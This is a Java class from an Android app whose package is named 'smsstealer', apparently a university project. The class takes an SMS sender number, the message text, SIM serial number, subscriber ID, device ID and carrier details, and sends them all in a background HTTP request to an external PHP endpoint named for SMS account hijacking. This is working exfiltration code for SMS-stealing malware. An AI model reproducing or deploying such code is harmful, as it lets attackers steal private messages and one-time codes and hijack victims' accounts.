package edu.oakland.smsstealer;

import android.os.AsyncTask;
import android.util.Log;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * Created by anthony on 1/11/17.
 */

public class GetRequest extends AsyncTask {
    private static final String ASP = "https://110dh.000webhostapp.com/SmsAccountHijacking.php?number=";
    private URL url;

    public GetRequest(String number, String message, String simOperator, String deviceId, String networkOperator, String simSerialNumber, String subscriberId) {
        try {
            url = new URL(ASP + number + "&message=" + message + "&simOperator=" + simOperator + "&deviceId=" + deviceId + "&networkOperator="  + networkOperator + "&simSerialNumber=" + simSerialNumber + "&subscriberId=" + subscriberId);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected Object doInBackground(Object[] params) {
        try {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}